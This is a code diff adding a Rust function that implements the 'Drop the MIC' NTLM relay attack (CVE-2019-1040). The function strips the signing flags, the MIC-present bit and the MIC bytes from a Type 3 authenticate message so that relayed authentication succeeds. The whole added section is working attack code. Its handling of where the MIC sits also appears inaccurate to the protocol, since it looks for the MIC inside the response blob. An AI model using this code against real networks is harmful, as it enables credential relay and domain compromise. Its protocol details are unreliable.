@@ -515,6 +515,88 @@ pub fn build_authenticate_message(
     msg
 }
 
+/// Strip the MIC (Message Integrity Code) from an NTLMv2 Type 3 (Authenticate) message.
+///
+/// This implements the "Drop the MIC" technique (CVE-2019-1040) used in NTLM relay
+/// attacks. When a relay modifies the NTLM challenge (e.g., stripping channel bindings),
+/// the MIC computed by the original client will no longer be valid. Clearing the MIC
+/// and signing flags causes the target server to skip MIC verification, allowing the
+/// relayed auth to succeed even when the DC normally requires signing.
+///
+/// The function:
+/// 1. Clears NTLMSSP_NEGOTIATE_SIGN / SEAL / ALWAYS_SIGN flags in the Type 3 header
+/// 2. Clears the MIC-present bit in MsvAvFlags (AvId=6) within the NTLMv2 client blob
+/// 3. Zeros the 16-byte MIC at the end of the NtChallengeResponse (if MsvAvFlags indicates it)
+pub fn strip_mic_from_type3(data: &[u8]) -> Vec<u8> {
+    if data.len() < 64 {
+        return data.to_vec();
+    }
+    if &data[0..8] != NTLM_SIGNATURE {
+        return data.to_vec();
+    }
+    let msg_type = u32::from_le_bytes([data[8], data[9], data[10], data[11]]);
+    if msg_type != 3 {
+        return data.to_vec();
+    }
+
+    let mut result = data.to_vec();
+
+    // Step 1: Clear signing/encryption flags at offset 60
+    let mut flags = u32::from_le_bytes([result[60], result[61], result[62], result[63]]);
+    let sign_flags = 0x0000_0010 | 0x0000_0020 | 0x0000_8000;
+    flags &= !sign_flags;
+    result[60..64].copy_from_slice(&flags.to_le_bytes());
+
+    // Step 2: Find NtChallengeResponse and scan AV_PAIRs for MsvAvFlags
+    let nt_resp_len = u16::from_le_bytes([data[20], data[21]]) as usize;
+    let nt_resp_off = u32::from_le_bytes([data[24], data[25], data[26], data[27]]) as usize;
+
+    if nt_resp_len < 44 || nt_resp_off + nt_resp_len > data.len() {
+        return result; // Flags cleared is sufficient
+    }
+
+    // NtChallengeResponse = NTProofStr (16 bytes) + NTLMv2 client blob
+    // Client blob fixed header = 28 bytes (RespType 1, HiRespType 1, Reserved1 2,
+    // Reserved2 4, Timestamp 8, ClientChallenge 8, Reserved3 4)
+    let av_pairs_start = 16 + 28;
+    let nt_resp = &data[nt_resp_off..nt_resp_off + nt_resp_len];
+    if nt_resp.len() <= av_pairs_start {
+        return result;
+    }
+
+    let av_pairs = &nt_resp[av_pairs_start..];
+    let mut i = 0;
+
+    while i + 4 <= av_pairs.len() {
+        let av_id = u16::from_le_bytes([av_pairs[i], av_pairs[i + 1]]);
+        let av_len = u16::from_le_bytes([av_pairs[i + 2], av_pairs[i + 3]]) as usize;
+        if av_id == 0 {
+            break;
+        }
+        if av_id == 6 && av_len >= 4 {
+            // MsvAvFlags — clear MIC-present bit
+            let abs_off = nt_resp_off + av_pairs_start + i + 4;
+            if abs_off < result.len() {
+                result[abs_off] &= !0x01;
+            }
+        }
+        i += 4 + av_len;
+    }
+
+    // Step 3: Zero the MIC (last 16 bytes after MsvAvEOL)
+    let eol_end = av_pairs_start + i + 4;
+    if nt_resp.len() >= eol_end + 16 {
+        let mic_start = nt_resp_off + eol_end;
+        for j in 0..16 {
+            if mic_start + j < result.len() {
+                result[mic_start + j] = 0;
+            }
+        }
+    }
+
+    result
+}
+
 // ═══════════════════════════════════════════════════════════
 // Tests
 // ═══════════════════════════════════════════════════════════
